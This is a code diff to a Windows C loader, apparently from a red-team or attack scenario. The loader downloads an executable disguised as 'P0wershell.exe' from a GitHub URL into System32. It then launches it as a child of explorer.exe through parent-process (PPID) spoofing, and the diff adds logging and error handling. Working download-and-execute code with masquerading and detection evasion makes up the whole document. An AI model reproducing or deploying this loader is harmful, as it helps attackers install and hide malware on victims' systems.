@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
+#include <urlmon.h>
 
 BOOL WINAPI IsUserAnAdmin(void);
 
@@ -35,43 +36,62 @@ int main(void) {
         printf("[-] No explorer.exe found.\n");
         return 1;
     }
+    printf("[+] Found explorer.exe PID: %lu\n", explorerPID);
 
     // download P0wershell.exe
     const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
     const char* outPath = "C:\\Windows\\System32\\P0wershell.exe";
+    printf("[+] Downloading P0wershell.exe...\n");
     HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
     if (hr != S_OK) {
-        printf("[-] Download failed.\n");
+        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
         return 1;
     }
+    printf("[+] Download complete.\n");
 
-    // PPID spoofing — launch P0wershell.exe as child of explorer.exe
+    // PPID spoofing
     HANDLE hExplorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPID);
     if (!hExplorer) {
-        printf("[-] Failed to open explorer.exe\n");
+        printf("[-] Failed to open explorer.exe (%lu)\n", GetLastError());
         return 1;
     }
+    printf("[+] Opened explorer.exe handle\n");
 
     SIZE_T attrSize = 0;
     InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
     PPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
     if (!attrList) {
+        printf("[-] HeapAlloc failed\n");
         CloseHandle(hExplorer);
-        printf("[-] Memory allocation failed.\n");
         return 1;
     }
-    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);
-    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL);
 
-    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
-    PROCESS_INFORMATION pi;
-    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
-        printf("[-] Failed to start P0wershell.exe\n");
+    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
+        printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
+        HeapFree(GetProcessHeap(), 0, attrList);
+        CloseHandle(hExplorer);
+        return 1;
+    }
+
+    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL)) {
+        printf("[-] UpdateProcThreadAttribute failed (%lu)\n", GetLastError());
         DeleteProcThreadAttributeList(attrList);
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hExplorer);
         return 1;
     }
+    printf("[+] PPID attribute set\n");
+
+    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
+    PROCESS_INFORMATION pi;
+    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
+        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList);
+        CloseHandle(hExplorer);
+        return 1;
+    }
+    printf("[+] P0wershell.exe launched with PPID spoofing (PID: %lu)\n", pi.dwProcessId);
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
